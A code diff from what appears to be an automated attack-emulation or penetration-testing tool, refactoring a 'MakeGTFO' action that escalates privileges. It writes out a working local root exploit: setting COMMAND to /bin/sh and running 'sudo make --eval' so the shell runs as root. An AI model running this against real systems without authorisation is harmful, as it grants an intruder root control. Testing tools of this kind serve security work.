@@ -49,14 +49,15 @@ class MakeGTFO(Action):
         """
         Exploit make command to get root session.
         """
-        session = pattern.get('session')
-        session_id = session.get("id")
-        channel = sessions.get_session(session_id)
-        run_command(channel, "COMMAND='/bin/sh'")
+        tulpa_session = pattern.get('session')
+        tulpa_session_id = tulpa_session.get('id')
+        live_session = sessions.get_session(tulpa_session_id)
+
+        live_session.run_command("COMMAND='/bin/sh'")
         cmd = r"sudo make -s --eval=$'x:\n\t-'" + r'"$COMMAND"'
-        output = run_command(channel, cmd)
+        output = live_session.run_command(cmd)
         return ActionExecutionResult(
-            command=[cmd], stdout="\n".join(output), session=session_id, logs=["Environment variable COMMAND='/bin/sh'"]
+            command=[cmd], stdout=output, session=tulpa_session_id, logs=["Environment variable COMMAND='/bin/sh'"]
         )
 
     def capture_state_change(
